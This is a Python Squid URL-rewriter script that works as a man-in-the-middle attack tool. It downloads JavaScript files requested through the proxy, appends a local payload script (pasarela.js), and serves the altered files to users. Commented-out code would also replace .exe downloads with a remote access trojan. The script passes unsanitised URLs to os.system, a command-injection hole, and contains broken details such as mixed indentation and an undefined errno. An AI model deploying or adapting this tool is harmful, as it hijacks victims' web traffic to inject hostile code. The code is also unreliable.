#!/usr/bin/env python

from subprocess import os
from sys import stdin, stdout
from re import search

PID = os.getpid()
LHOST = 'http://127.0.0.1/'
JSFILE = '%d-%07d.js' % (PID, PID)
PASARELA = '/etc/squid/pasarela.js'
APACHE_CONF = '/etc/apache2/sites-available/000-default.conf'

if os.path.exists(APACHE_CONF):
    root = search(r'DocumentRoot (\/.+)', open(APACHE_CONF).read())
    try:
        ROOT = root.group(1)
    except:
        raise

if ROOT.endswith('/'):
    TMPPATH = ROOT + 'tmp/'
else:
    TMPPATH = ROOT + '/tmp/'

'''
def install_rat(url):
    # REPLACE THIS WITH YOUR OWN RAT
    return '%s%s%s' % (LHOST, RAT, '\n', )
'''

def modify_url(line):
    new_url = '\n'
    list = line.split(' ')

    old_url = search(r'(^\w{3,10}:\/\/[^\?;&]+\.js)(?:\?.+)?$', list[0])
    '''
    old_url = search(r'(^\w{3,10}:\/\/[^\?;&]+(?:\.js|exe))(?:\?.+)?$', list[0])
    '''

    if old_url is not None:
        '''
        if(str(old_url.group(1)).endswith('.exe')):
            return install_rat(old_url.string)
        '''
    	old_url = old_url.string
    	if not os.path.isdir(TMPPATH):
	    try:
	        os.makedirs(TMPPATH)
	        os.chmod(TMPPATH, 0755)
	    except OSError as exception:
	        if exception.errono != errno.EEXIST:
	            raise
	os.system('wget -q -O %s%s %s' % (TMPPATH, JSFILE, old_url))
	with open(TMPPATH+JSFILE, 'a') as js:
	    js.write(open(PASARELA).read())
	os.chmod(TMPPATH+JSFILE, 0644)
    	new_url = '%stmp/%s%s' % (LHOST, JSFILE, new_url)

    return new_url

if __name__ == '__main__':
    while True:
        line = stdin.readline().strip()
        new_url = modify_url(line)
        stdout.write(new_url)
        stdout.flush()
